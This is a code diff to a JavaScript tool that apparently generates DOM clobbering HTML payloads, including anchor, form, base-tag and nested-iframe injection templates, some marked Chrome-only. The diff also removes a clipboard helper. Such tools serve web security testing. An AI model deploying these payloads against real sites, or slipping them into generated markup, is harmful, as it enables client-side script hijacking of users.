@@ -49,13 +49,13 @@ let create_dom_clobbering_html_payload = function (statement) {
             
             else if(clobbering_value === ""){                        // in this Just clobbering  -> any tag with id works for window clobbering could add more 
                 output = output.concat([
-                    `<anytag id="${code_targets[1]}"> works basically`
+                    `<anytag id="${code_targets[1]}">`
                 ]);
 
             }
             else{
                 output = output.concat([
-                    `${statement.clobbering_target} on toString() being called will return :  ${clobbering_value}`,
+                    
                     `<base href="x:"><a id="${code_targets[1]}" href="${clobbering_value}"></a>`,   
                     `<base href="x:"><area id="${code_targets[1]}" href="${clobbering_value}"></a>`
                 ]);
@@ -71,7 +71,7 @@ let create_dom_clobbering_html_payload = function (statement) {
 
 			if(statement.clobbering_value === ""){
                 output = output.concat([
-					`Chrome: <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
+					`Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
 					`<form id="${code_targets[1]}"><input id="${code_targets[2]}"/> </form>`,
 					`<form id="${code_targets[1]}"><button id="${code_targets[2]}"/> </form>`,
 					`<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
@@ -156,28 +156,28 @@ let create_dom_clobbering_html_payload = function (statement) {
                     }  else if (code_targets[3] === 'username') {
                         //  window.x.y.username works only on chrome 
                         output = output.concat([
-                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}:x@x.com"></a>`,
+                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="http://${clobbering_value}:x@x.com"></a>`,
                         
                         ]);
                     
                     }else if (code_targets[3] === 'password') {
                         //  window.x.y.password works only on chrome 
                         output = output.concat([
-                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="random:${clobbering_value}@x.com"></a>`,
+                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="http://random:${clobbering_value}@x.com"></a>`,
                         
                         ]);
                     
                     }else if (code_targets[3] === 'host') {
                         //  window.x.y.host works only on chrome 
                         output = output.concat([
-                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="x:x@${clobbering_value}"></a>`,
+                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="http://x:x@${clobbering_value}"></a>`,
                         
                         ]);
                     
                     } else{            
                         //  window.x.y.z we need </form> for the form payload to become a HTML Collection!!
                         output = output.concat([
-                            `Chrome : <form id="${code_targets[1]}">\n</form><form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
+                            `Chrome : <form id="${code_targets[1]}"></form><form id="${code_targets[1]}" name="${code_targets[2]}"><input name="${code_targets[3]}" value="${clobbering_value}"></form>`,
                             `<base href="x:"><iframe name=${code_targets[1]} srcdoc="<iframe name=${code_targets[2]} srcdoc='<a id=${code_targets[3]} href=${clobbering_value}>'></iframe>"></iframe>`,
                         ]);
             
@@ -260,18 +260,7 @@ function sanitize(markup) {
     return markup.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
-function copyToClipboard(elem, copied_banner) {
-    var range = document.createRange();
-    range.selectNode(elem);
-    window.getSelection().removeAllRanges(); // clear current selection
-    window.getSelection().addRange(range); // to select text
-    document.execCommand("copy");
-    window.getSelection().removeAllRanges(); // to deselect
 
-    $(copied_banner).show().animate({ top: -25, opacity: 0 }, 700, function () {
-        $(this).css({ top: 0, opacity: 1 }).hide();
-    });
-}
 
 
 const submit_button = document.getElementById('submit');
